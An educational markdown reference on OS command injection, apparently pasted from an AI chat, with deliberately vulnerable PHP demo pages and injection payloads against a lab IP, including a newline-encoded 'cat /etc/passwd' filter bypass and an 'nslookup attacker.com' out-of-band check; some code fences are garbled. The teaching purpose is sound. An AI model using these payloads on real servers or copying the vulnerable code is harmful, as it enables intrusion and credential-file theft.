defination- jab website or application kuch bhi chij direct os se la ri toh wha os command injection chalega


# 🛡️ OS Command Injection

> **Web Application Penetration Testing – Educational Reference**

---

## 📌 What is OS Command Injection?

**OS Command Injection** (also called _Shell Injection_) is a **critical security vulnerability** that allows attackers to execute **arbitrary operating system commands** on a server.

This happens when:

- User input is passed directly to system commands
    
- No proper validation or sanitization is applied
    
- Functions like `system()`, `exec()`, `passthru()` are misused
    

### ⚠️ Impact

- Remote command execution
    
- Data leakage
    
- Privilege escalation
    
- Full server compromise
    

---

## 🧠 How OS Command Injection Works

### Example Scenario

A web app allows checking stock using URL parameters:

`https://insecure-website.com/stockStatus?productID=381&storeID=29`

### Backend Command:

`stockreport.pl 381 29`

### Attacker Input:

`381 & echo hacked &`

### Final Command Executed:

`stockreport.pl 381 & echo hacked & 29`

### Result:

- Original command executes
    
- `echo hacked` executes
    
- `29` is treated as a command (error)
    

---

## ⚙️ Common OS Command Injection Techniques

### 🔹 Command Separators

`;   &&   ||   |`


## **1. Semicolon `;` - Command Separator**

Executes commands **sequentially**, one after another.

bash

````bash
ls -lh /home ; whoami
```
- First runs: `ls -lh /home`
- Then runs: `whoami`
- Both commands execute regardless of success/failure

**Attack example:**
```
?path=/home; cat /etc/passwd
Executes: ls -lh /home; cat /etc/passwd
````

---

## **2. Double Pipe `||` - OR Operator**

Executes the **second command ONLY if the first fails**.

bash

````bash
ls /fakedir || whoami
```
- First tries: `ls /fakedir` (fails - directory doesn't exist)
- Since it failed, runs: `whoami`

**Attack example:**
```
?path=/nonexistent || cat /etc/passwd
Executes: ls -lh /nonexistent || cat /etc/passwd
(Shows password file if ls fails)
````

---

## **3. Double Ampersand `&&` - AND Operator**

Executes the **second command ONLY if the first succeeds**.

bash

````bash
cd /tmp && rm file.txt
```
- First runs: `cd /tmp`
- Only if successful, then runs: `rm file.txt`

**Attack example:**
```
?path=/home && cat /etc/passwd
Executes: ls -lh /home && cat /etc/passwd
(Shows password file if ls succeeds)
````

---

## **4. Single Pipe `|` - Pipe Operator**

Sends the **output of first command as input to second command**.

bash

````bash
cat file.txt | grep "password"
```
- `cat file.txt` outputs the file content
- `|` pipes it to `grep`
- `grep "password"` searches for "password" in that output

**Attack example:**
```
?path=/home | whoami
Executes: ls -lh /home | whoami
(Ignores ls output, just shows current user)
````

---

## **5. Dollar Sign `$` - Variable/Command Substitution**

### **`$(command)` - Command Substitution**

Executes the command inside `$()` and uses its output.

bash

````bash
echo "Current user is $(whoami)"
```
- First executes: `whoami`
- Then inserts the result into the echo command

**Attack example:**
```
?path=$(whoami)
Executes: ls -lh $(whoami)
(First runs whoami, then uses that as path)
````

### **Backticks `` `command` `` - Old-style Command Substitution**

Same as `$()` but older syntax:

bash

```bash
echo "User is `whoami`"
```

---

## **6. Double Dollar `$$` - Current Process ID**

Returns the **Process ID (PID)** of the current shell.

bash

````bash
echo $$
Output: 12345 (the PID number)
```

**Not commonly used in attacks**, but could be used for:
```
?path=/proc/$$
Executes: ls -lh /proc/12345
(Shows info about current process)
````

---

## **Summary Table:**

| Operator | Name         | Purpose                       | Example        |
| -------- | ------------ | ----------------------------- | -------------- |
| `;`      | Separator    | Run commands sequentially     | `cmd1 ; cmd2`  |
| `\|`     | OR           | Run cmd2 if cmd1 fails        | `cmd1 \| cmd2` |
| `&&`     | AND          | Run cmd2 if cmd1 succeeds     | `cmd1 && cmd2` |
| `\|`     | Pipe         | Send cmd1 output to cmd2      | `cmd1 \| cmd2` |
| `$()`    | Substitution | Run command, use output       | `$(whoami)`    |
| `` ` ``  | Substitution | Run command, use output (old) | `` `whoami` `` |
| `$$`     | Process ID   | Current shell PID             | `echo $$`      |
### 🔹 Command Substitution

`` `command` $(command) ``

### 🔹 Blind Injection (Timing Based)

`ping -c 10 127.0.0.1`

### 🔹 Output Redirection

`whoami > /var/www/html/output.txt`

### 🔹 Out-of-Band (OAST)

`nslookup attacker.com`

---

## 🧪 Useful Commands for Testing

|Purpose|Linux|Windows|
|---|---|---|
|Current User|`whoami`|`whoami`|
|OS Info|`uname -a`|`ver`|
|Network Info|`ifconfig`|`ipconfig /all`|
|Active Connections|`netstat -an`|`netstat -an`|
|Running Processes|`ps -ef`|`tasklist`|

---

## 🧩 Practical Examples

---

### ✅ Vulnerable PHP Example

`<?php $file = $_GET['filename']; system("rm $file"); ?>`

### 🚨 Exploit

`http://example.com/delete.php?filename=test.txt;id`

➡ Executes:

`rm test.txt id`

---

### ✅ C Language Example

`char command[256]; strcat(command, "time "); strcat(command, argv[1]); system(command);`

📌 If input is:

`ls`

➡ `ls` executes unintentionally.

---

## 🧪 OS Command Injection – Demo Code

### File: `os-command-injection.php`

`<?php if (isset($_REQUEST['path'])) {     $cmd = "ls -lh " . $_REQUEST['path'];     passthru($cmd); } ?>`

---

## 🧨 Payload Examples

### 1️⃣ Normal Directory Listing

`http://192.168.1.31/web-pentest/os-command-injection.php?path=/var/log`

### 2️⃣ Empty Input

`http://192.168.1.31/web-pentest/os-command-injection.php?path=`

### 3️⃣ Home Directory

`http://192.168.1.31/web-pentest/os-command-injection.php?path=/home`

### 4️⃣ Relative Path

`http://192.168.1.31/web-pentest/os-command-injection.php?path=../php/upload`

### 5️⃣ Pipe Injection

`http://192.168.1.31/web-pentest/os-command-injection.php?path=/|id`

➡ Executes:

`ls -lh / | id`

### 6️⃣ Semicolon Injection

`http://192.168.1.31/web-pentest/os-command-injection.php?path=/;id`

---

## 🛡️ Prevention Strategies

✅ **Never trust user input**  
✅ **Avoid using system()/exec()**  
✅ **Use allow-lists instead of block-lists**  
✅ **Use language-native APIs**  
✅ **Escape input properly**  
✅ **Use parameterized execution**

### ❌ Bad

`system("ls " . $_GET['dir']);`

### ✅ Good

`escapeshellarg($_GET['dir']);`

---

## 📌 Summary

✔ OS Command Injection allows execution of system commands  
✔ Common in poorly validated input  
✔ Extremely dangerous if exploited  
✔ Preventable using secure coding practices



## ⚠️ Vulnerability Description

### Core Concepts

- **Payloads**: `|` (pipe) and `;` (semicolon) allow attackers to chain commands and execute arbitrary commands on the server
- **Root Cause**: Unchecked concatenation is the core of the OS command injection vulnerability
- **Attack Vector**: The attacker can replace `id` with any other malicious command to compromise the server

---

## 💻 Vulnerable Code Example

### `os-command-injection-2.php`

php

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>OS Command Injection</title>
</head>
<body>
    <pre>
    <?php
    if (isset($_REQUEST['path'])) {
        // Replace semicolons in user input with spaces, attempting to prevent command chaining
        $cmd = "ls -lh " . str_replace(';', ' ', $_REQUEST['path']);
        
        // Execute the constructed command and output the result
        passthru($cmd);
    }
    ?>
    </pre>
</body>
</html>
```

### 🔍 Explanation

1. The PHP code checks for a `path` parameter in the request
2. It uses `str_replace(';', ' ', $_REQUEST['path'])` to replace semicolons (`;`) with spaces in the input
3. This is an **incomplete** mitigation attempt to prevent command chaining
4. However, other shell metacharacters like `|` or `&&` remain exploitable
5. The code then runs the command with `passthru()`, showing raw command output on the webpage
6. Since no full input validation or escaping is done, **the vulnerability to OS command injection remains**

---

## 🛡️ Improved Code (With Validation)

### `os-command-injection-3.php`

php

````php
<?php
if (isset($_REQUEST['path'])) {
    // Check if 'path' contains any of the characters: ; (semicolon), | (pipe), & (ampersand)
    if (!preg_match('/[;|\\|\&]/', $_REQUEST['path'])) {
        
        // If none of these characters are present, construct the command safely
        $cmd = "ls -lh " . $_REQUEST['path'];
        
        // Execute the command and output the result
        passthru($cmd);
        
    } else {
        // If disallowed characters are found, output an error message
        echo "Error";
    }
}
?>
```

### ✅ Security Improvements

- Validates input against strict whitelists
- Uses regex to detect dangerous characters: `;`, `|`, `&`
- Displays error message if malicious characters are found
- **Note**: Proper prevention involves using `escapeshellarg()` or better yet, avoiding shell commands with user input altogether

---

## 🎯 Exploitation Payloads

### 1. **Basic Directory Listing (No Injection)**
```
?path=/var/log
```
**Result**: Lists contents of `/var/log`

---

### 2. **Using Pipe Character to Chain Commands**
```
?path=/ | id
````

**Execution**:

bash

````bash
ls -lh /
id
```
**Result**: Runs `ls -lh /` and pipes output to `id`, which returns the user identity

---

### 3. **Using Double Ampersand to Chain Commands**
```
?path=/ && id
````

**Execution**:

bash

````bash
ls -lh /
id
```
**Result**: Runs `ls -lh /` and then runs `id` if the first command succeeds

---

### 4. **Using Backticks or $() Command Substitution**
```
?path=/ $(id)
````

**Execution**:

bash

````bash
ls -lh / + runs id through command substitution
```
**Result**: Executes `ls -lh /` plus runs `id` through command substitution

---

### 5. **Combined Injection: Newline and Concatenation**
```
?path=..%0A%0A%20cat%20/etc/passwd
````

**URL Decoded**: `?..\n\n cat /etc/passwd`

**Execution**:

bash

````bash
ls -lh .

cat /etc/passwd
```
**Result**: The `%0A` is a URL-encoded newline, so the command becomes:
1. `ls -lh .`
2. `cat /etc/passwd`

This bypasses the regex since newline is not filtered, allowing execution of `cat /etc/passwd`

---

### 6. **Another Injection with Newline and `id`**
```
?path=..%0A%0A%20id
````

**Execution**:

bash

````bash
ls -lh .

id
```

---

## 📝 Complete Payload Examples

### Empty Path
```
http://192.168.1.31/web-pentest/os-command-injection.php?path=
```
**Result**: Runs `ls -lh` with no argument, listing the current directory

---

### Normal Directory Listing
```
http://192.168.1.31/web-pentest/os-command-injection.php?path=/home
```
**Result**: Lists contents of `/home`

---

### Injection with Pipe
```
http://192.168.1.31/web-pentest/os-command-injection2.php?path=/|id
```
**Result**: Runs `ls -lh /` and pipes output to `id`, showing user identity; bypasses simple `;` replacement

---

### Injection with Newline and Concatenation
```
http://192.168.1.31/web-pentest/os-command-injection3.php?path=..%0A%0A%20cat%20/etc/passwd
````

**Decoded**: `?..\n\n cat /etc/passwd`

**Result**:

bash

````bash
ls -lh .
cat /etc/passwd
```
This bypasses the regex since newline is not filtered, allowing execution of `cat /etc/passwd`

---

### Another Newline Injection with `id`
```
http://192.168.1.31/web-pentest/os-command-injection3.php?path=..%0A%0A%20id
````

**Result**: Executes `id` command after `ls`

---

## 🛠️ Prevention Best Practices

### ⭐ Recommended Approaches

1. **Avoid Shell Commands**: Use native PHP functions instead of shell commands
    - Use `scandir()`, `file_exists()`, etc. instead of `ls`
2. **Input Validation**: Validate input against strict whitelists

php

```php
   if (!preg_match('/^[a-zA-Z0-9_\/-]+$/', $input)) {
       die("Invalid input");
   }
```

3. **Use `escapeshellarg()`**: If shell commands are necessary

php

```php
   $cmd = "ls -lh " . escapeshellarg($_REQUEST['path']);
```

4. **Parameterized Commands**: Use libraries that support parameterized execution
5. **Principle of Least Privilege**: Run web applications with minimal necessary permissions

---

## 📚 Summary

|Attack Type|Payload Character|Example|Bypasses Semicolon Filter?|
|---|---|---|---|
|Pipe|`\|`|`?path=/\|id`|✅ Yes|
|Double Ampersand|`&&`|`?path=/&&id`|✅ Yes|
|Command Substitution|`$()`|`?path=/ $(id)`|✅ Yes|
|Newline|`%0A`|`?path=..%0A%0Aid`|✅ Yes|
|Semicolon|`;`|`?path=/;id`|❌ No (filtered)|

---

## ⚖️ Legal Disclaimer

This information is provided for **educational purposes only**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing security vulnerabilities.

---

## 🔗 Resources

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/os-command-injection)
- [PHP Manual: escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php)

---

**Repository**: OS Command Injection Examples  
**Last Updated**: December 30, 2024  
**License**: MIT

[Claude is AI and can make mistakes.  
Please double-check responses.](https://support.anthropic.com/en/articles/8525154-claude-is-providing-incorrect-or-misleading-responses-what-s-going-on)

  

Sonnet 4.5